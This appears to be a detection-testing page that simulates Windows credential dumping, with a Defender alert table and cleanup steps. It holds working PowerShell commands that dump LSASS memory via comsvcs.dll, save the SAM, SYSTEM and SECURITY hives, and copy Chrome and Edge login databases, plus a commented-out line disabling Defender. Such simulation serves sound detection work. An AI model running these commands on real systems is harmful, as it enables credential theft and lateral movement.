# Credential Dumping & Exfiltration

Credential dumping is a technique used by attackers to extract stored authentication credentials—such as usernames, passwords, or hashes—from a system's memory or security databases. These credentials can then be used for lateral movement, privilege escalation, or unauthorized access to sensitive systems.

## Simulation

Run the following commands in PowerShell as Administrator on a test device.

[ ] TODO: Create Script

> **Note:** Download the [simulation script here]().
> To execute the simulation run the command ``.
> To clean up the simulation run the command ` -CleanUp`.

### LSASS Memory Dumping

**LSASS Memory Dumping** attempts to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, various credentials are generated and stored in LSASS memory. Attackers, particularly those with administrative privileges, can harvest this credential material and use it for lateral movement, leveraging alternate authentication methods to gain access to other systems.

```powershell
$folderPath = "$env:TEMP\LSASSdump"
New-Item -Path $folderPath -ItemType Directory
#Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath $folderPath
$lsassPID = (Get-Process -Name lsass).Id
cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $folderPath\out.dmp full"
```

### SAM Credential Extraction

**SAM Credential Extraction** is a technique where attackers attempt to retrieve credential material from the Security Account Manager (SAM) database, either by accessing it in memory or through the Windows Registry where it is stored. The SAM database contains local account credentials, typically visible using the net user command. Extracting data from the SAM requires SYSTEM-level privileges, allowing attackers to potentially gain access to sensitive user credentials for further exploitation.

```powershell
$folderPath = "$env:TEMP\SAPdump"
New-Item -Path $folderPath -ItemType Directory
reg save HKLM\sam "$folderPath\sam" /y
reg save HKLM\system "$folderPath\system" /y
reg save HKLM\security "$folderPath\security" /y
```

### Browser Credential Theft

**Credentials from Web Browsers** is a technique where attackers obtain saved credentials from web browsers by accessing browser-specific files. Web browsers often store usernames and passwords in an encrypted format within a credential store to enable auto-login for websites. However, attackers can extract these credentials in plaintext.

```powershell
$folderPath = "$env:TEMP\BrowserDump"
New-Item -Path $folderPath -ItemType Directory
esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" /d "$folderPath\Chrome_Login_Data.tmp"
esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" /d "$folderPath\Chrome_Login_DataForAccount.tmp"
esentutl.exe /y "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" /d "$folderPath\Edge_Login_Data.tmp"
```

## Cleanup

```powershell
$folderPath = "$env:TEMP\LSASSdump"
Remove-Item -Path $folderPath -Recurse -Force

$folderPath = "$env:TEMP\SAPdump"
Remove-Item -Path $folderPath -Recurse -Force

$folderPath = "$env:TEMP\BrowserDump"
Remove-Item -Path $folderPath -Recurse -Force
```

## Detections

| Alert Title | Alert Description | Alert Details |
| -- | -- | -- |
| TODO | Add details of LSASS Detections | To this Table |
| An active 'RegistryExfil' malware in a command line was prevented from executing | Malware and unwanted software are undesirable applications that perform annoying, disruptive, or harmful actions on affected machines. Some of these undesirable applications can replicate and spread from one machine to another. Others are able to receive commands from remote attackers and perform activities associated with cyber attacks. A malware is considered active if it is found running on the machine or it already has persistence mechanisms in place. Active malware detections are assigned higher severity ratings. Because this malware was active, take precautionary measures and check for residual signs of infection. | **Category:** Malware<br/>**MITRE ATT&CK Techniques:** N/A<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** Antivirus<br/>**Detection technology:** Client,Heuristic<br/>**Detection status:** Blocked |
| Possible theft of passwords and other sensitive web browser information | A process might be attempting to retrieve sensitive web browser information, such as saved passwords, cookies, or the browsing history. | **Category:** Credential access<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1005: Data from Local System, T1119: Automated Collection, T1539: Steal Web Session Cookie, T1550.004: Web Session Cookie, T1552.001: Credentials In Files, T1555.003: Credentials from Web Browsers, T1555.004: Windows Credential Manager<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |

### References

* [Github: LearningKijo/ResearchDev/LSASS Dumping](https://github.com/LearningKijo/ResearchDev/blob/main/DEV/DEV04-LSASSdumping-MiniDump/Dev04-LSASSdumping-MiniDump.md)
